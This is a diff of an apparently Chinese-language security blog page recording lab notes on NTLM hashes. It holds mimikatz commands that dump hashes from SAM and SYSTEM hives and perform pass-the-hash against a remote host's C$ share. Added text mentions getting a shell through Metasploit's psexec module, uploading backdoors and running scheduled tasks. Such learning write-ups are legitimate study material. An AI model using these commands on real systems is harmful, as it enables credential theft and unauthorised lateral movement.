@@ -165,7 +165,7 @@
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>October 28, 2020</span
         class="post-info-item">
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1174</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1192</span>
     </div>
   </div>
 </section>
@@ -187,12 +187,14 @@
 <h5 id="mimikatz读取hash"><a href="#mimikatz读取hash" class="headerlink" title="mimikatz读取hash"></a>mimikatz读取hash</h5><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-attr">lsadump:</span>:sam <span class="hljs-regexp">/sam:sam.hive /</span><span class="hljs-attr">system:</span>system.hive<br></code></pre></td></tr></table></figure>
 
 <p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/2020-10-16/ntlm2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<h4 id="3-2-hash传递登陆"><a href="#3-2-hash传递登陆" class="headerlink" title="3.2 hash传递登陆"></a>3.2 hash传递登陆</h4><p><strong>实验用到的是mimikatz的hash传递。通过以下命令win7和win2003执行成功，弹出cmd窗口，利用ipc管道查看c盘目录</strong>,</p>
+<h4 id="3-2-hash传递登陆"><a href="#3-2-hash传递登陆" class="headerlink" title="3.2 hash传递登陆"></a>3.2 hash传递登陆</h4><p><strong>实验用到的是mimikatz的hash传递。通过以下命令win7和win2003执行成功，弹出cmd窗口，利用ipc管道查看c盘目录，后续利用可以上传后门，计划任务执行等</strong>,</p>
 <p><strong>命令：</strong></p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-attr">sekurlsa:</span>:pth <span class="hljs-regexp">/user:用户名 /</span><span class="hljs-attr">domain:</span>ip地址 /<span class="hljs-attr">ntlm:</span>用户hash<br>dir \\ip地址\c$<br></code></pre></td></tr></table></figure>
 
 <p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/2020-10-16/ntlm3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p><strong>另一台win7没有执行成功，可能是做了策略之类的，这个是工作组hash传递，域hash如果拿到kgbrt账号的hash可以利用mimikatz等工具伪造黄金票据等，后续学习更新。</strong></p>
+<p><strong>也可通过msf下psexec模块执行hash传递获取shell</strong><br><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/2020-10-16/ntlm4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >**</p>
+<p><strong>第一次没有执行成功因为没有添加LM hash,后来了解可以用32个0代替，结果成功执行</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/2020-10-16/ntlm5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br><strong>域hash后续更新。</strong></p>
 
       </section>
       <section class="extra">
